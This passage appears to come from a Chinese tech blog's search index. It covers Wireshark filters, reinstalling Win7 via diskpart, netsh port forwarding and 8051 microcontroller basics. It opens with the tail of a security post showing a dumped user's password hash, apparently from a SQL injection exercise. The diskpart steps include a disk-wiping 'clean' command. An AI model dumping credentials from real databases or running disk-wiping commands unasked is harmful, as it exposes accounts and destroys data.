SmithSurname: 5f4dcc3b5aa765d61d8327deb882cf99]]></content>
      <categories>
        
          <category> 安全 </category>
        
      </categories>
      <tags>
        
          <tag> sql </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[WireShark过滤规则]]></title>
      <url>/network/2018/12/19/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/</url>
      <content type="text"><![CDATA[1 WireShark过滤规则1.1 过滤IPip.dst == 1.1.1.1ip.src eq 192.168.120.184ip.addr eq 192.168.120.1841.2 过滤MAC地址eth.src == af:4f:3d:7f:2d:23eth.dst eq 56:8d:2a:3e:2c:03eth.addr eq 2e:0a:87:02:34:641.3 过滤端口tcp.port eq 22tcp.dstport == 80tcp.srcport eq 23udp.port eq 3389tcp.port &gt;= 1 and tcp.port &lt;= 10241.4 http模式过滤http.host == "www.myhost.com"http.request.method == "GET"http.request.method == "POST"http contains "test"1.5 包长度过滤udp.length eq 26tcp.len eq 94frame.len == 119]]></content>
      <categories>
        
          <category> Network </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[由Win10操作系统更换至Win7操作系统]]></title>
      <url>/windows/2018/12/10/%E7%94%B1win10%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%8D%A2%E8%87%B3win7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      <content type="text"><![CDATA[1 更改系统1.1 安装系统准备在安装Win7系统之前，需要备份Win10操作系统所在磁盘中的所有用户数据，系统重新安装之后原有数据都将丢失。首先需要准备备好一个安装U盘或者安装光盘，并提前准备好硬盘、USB及网卡等必要的驱动程序，在安装过程或安装后可能会使用到。1.2 安装Win7系统一切准备工作做好后，就可以进行Win7系统的安装了，更改默认的启动方式，选择U盘或者光驱进入Win7安装界面。然后按照如下的操作方法进行磁盘格式的更改，成功之后就可以顺利的进行Win7系统的安装了):shift + F10Diskpartlist disk  //列出当前计算机上的所有物理磁盘select disk 1  //磁盘编号从0开始，这里选择了第二块磁盘clean  //清除物理磁盘所有信息convert mbr  //更改格式exitexit当做完上述操作之后就可以进行磁盘的分区，及系统的安装，如果找不到磁盘可以尝试加载磁盘驱动程序，后续的安装比较简单可以按照提示做即可。]]></content>
      <categories>
        
          <category> Windows </category>
        
      </categories>
      <tags>
        
          <tag> Dos </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Windows端口转发]]></title>
      <url>/windows/2018/12/10/windows%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      <content type="text"><![CDATA[1 使用端口转发在Windows操作系统中有时候需要更改初始服务端口才能够访问时（防火墙阻断正常端口访问），更改软件端口又比较麻烦时，可以使用Windows操作系统自带的端口转发软件，或者其它情况下需要做端口转发时则可以使用一下此方法实现。添加:netsh interface portproxy add v4tov4 listenport=转发端口 listenaddress=本机IP connectport=目标端口 connectaddress=目标IP删除:netsh interface portproxy delete v4tov4 listenport=转发端口 listenaddress=本机IP]]></content>
      <categories>
        
          <category> Windows </category>
        
      </categories>
      <tags>
        
          <tag> Dos </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[51单片机]]></title>
      <url>/%E5%8D%95%E7%89%87%E6%9C%BA/2018/12/05/51%E5%8D%95%E7%89%87%E6%9C%BA/</url>
      <content type="text"><![CDATA[1 单片机结构一台计算机由一下几部分组成：CPU、RAM、ROM、I/O设备。在个人计算机这些部分在集成在多个芯片上，而在单片机中这些都被集成到一块芯片中，单片机是一种控制芯片，一个微型的计算机。1.1 单片机引脚单片机的40个引脚大致可以分为4类：电源、时钟、控制、I/O引脚。1、电源VCC 芯片电源 +5VVSS 接地端2、时钟XTAL1、XTAL2 晶体振荡电路反向输入端和输出端3、控制线：控制线共有四根a、ALE/PROG:地址锁存允许/片内EPROM编程脉冲AEL功能：用来锁存P0口送出的低8位地址PROG功能：片内有EPROM的芯片，在EPROM编程期间，此引脚输入编程脉冲b、PSEN：外ROM读选通信号c、RST/VPD：复位/备用电源RST功能：复位信号输入端VPD功能：在VCC掉电情况下，使用备用电源d、EA/Vpp：内部ROM选择/片内EPROM编程电源EA功能：内外ROM选择端Vpp功能：片内有EPROM芯片，在EPROM编程期间，施加编程电源Vpp4、I/O线80C51共有4个8位并行I/O端口：P0、P1、P2、P3口，共有32个引脚，P3还具有第二功能，用于特殊信号输入输出和控制信号（输入控制总线）。1.2 特殊功能寄存器在单片机中有一些独立的存储单元用来控制定时器/计数器，串行I/O口等器件，被称为特殊功能寄存器（SFR）。特殊功能寄存器如下表：符号地址功能BF0HB寄存器ACCE0H累加器PSWD0H程序状态字IPB8H中断优先级控制寄存器P3B0HP3口锁存器IEA8H中断允许控制寄存器P2A0HP2口锁存器SBUF99H串行口锁存器SCON98H串行口控制寄存器P190HP1口锁存器TH18DH定时器/计数器1（高8位）TH08CH定时器/计数器1（低8位）TL18BH定时器/计数器0（高8位）TL08AH定时器/计数器0（低8位）TMOD89A定时器/计数器方式控制寄存器TCON88H定时器/计数器控制寄存器DPH83H数据地址指针（高8位）DPL82H数据地址指针（低8位）SP81H堆栈指针P080HP0口锁存器PCON87H电源控制寄存器2 单片机寻址方式与指令系统2.1 指令格式在MCS-51指令中，一般指令主要由操作码、操作数组成。指令应该有如下功能：1、操作码指明执行什么性质和类型的操作2、操作数指明操作的数本身或者是操作数所在的地址3、指定操作结果存放的地址2.2 寻址方式1、立即寻址操作数以指令形式出现，称作立即数，用#号的8位或者16位数来表示。MOV A, #60H    ;A &lt;- #60HMOV 30H, #40   ;30H单元 &lt;- #40H以上命令执行完成之后，累加器A中数据为立即数据60H，30H单元中数据为立即数40H。2、直接寻址指令中直接给出操作数的8位地址，能进行直接寻址的存储空间有SFR和片内RAM。MOV PSW, #20HPSW直接地址为D0H，在指令中可使用其名称MOV A, 30H30为直接给出的内部RAM地址。3、寄存器寻址INC DPTR    ;DPTR &lt;- DPTR+1ADD A, R2   ;A &lt;- A+R24、寄存器间接寻址以寄存器的内容为操作数的地址，在寄存器前加@用来区分。即以寄存器作为指针，可用来访问片内RAM和片外RAM，不能访问SFR。能作为间接寻址的寄存器有R0、R1、DPTR、SP，其中R0、R1是指所选中的工作寄存器，SP仅用于堆栈操作。MOV @R0, A访问片内RAM5、变址寻址变址寻址只能对程序存储器中的数据进行读取访问，在指令符号上采用MOVC的形式。6、相对寻址相对寻址是为实现程序的相对转移而设计。]]></content>
      <categories>
        
          <category> 单片机 </category>
        
      </categories>
      <tags>
        
          <tag> C </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
